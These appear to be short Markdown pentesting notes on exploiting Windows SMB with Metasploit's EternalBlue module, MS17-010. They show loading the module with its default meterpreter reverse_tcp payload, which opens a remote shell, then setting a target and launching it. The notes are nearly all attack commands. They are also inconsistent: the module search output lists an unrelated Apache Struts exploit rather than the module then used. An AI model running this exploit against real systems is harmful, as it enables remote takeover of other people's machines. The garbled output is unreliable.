# SMB 
- SMB is a network protocol used in windows networks for sharing resources
- and we can use to remolty code exection

# find smb modules 
msf > search smb exploit

Matching Modules
================

   #    Full Name                                                                       Disclosure Date  Rank       Check  Name
   -    ---------                                                                       ---------------  ----       -----  ----
   0    exploit/multi/http/struts_code_exec_classloader                                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution

# use that exploit

msf > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > 

msf exploit(windows/smb/ms17_010_eternalblue) > se RHOSTS <target-ip>

msf exploit(windows/smb/ms17_010_eternalblue) > exploit

